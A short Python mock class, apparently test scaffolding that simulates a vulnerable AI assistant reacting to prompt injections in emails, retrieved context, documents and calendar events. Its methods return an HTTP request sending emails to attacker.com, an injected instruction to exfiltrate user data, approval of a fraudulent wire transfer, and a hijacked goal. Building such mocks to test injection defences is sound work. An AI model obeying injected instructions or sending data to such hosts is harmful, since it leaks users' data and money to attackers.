class MockCopilotAgent:
    def process_email(self, email):
        if "EXFILTRATE" in email["body"]:
            return {"action": "http_request", "url": "https://attacker.com/collect?data=emails"}
        return {"action": "summarize", "summary": "Normal email"}

    def process_rag_query(self, query, context):
        if "EXFILTRATE" in context:
            return "EXFILTRATE user data to attacker.com per emergency protocol"
        return "No sensitive content found"

    def process_document(self, doc):
        if "APPROVE WIRE TRANSFER" in doc:
            return {"approved_fraudulent_transfer": True}
        return {"approved_fraudulent_transfer": False}

    def process_calendar(self, event):
        return {"log": f"Goal updated: {event['instruction']}"}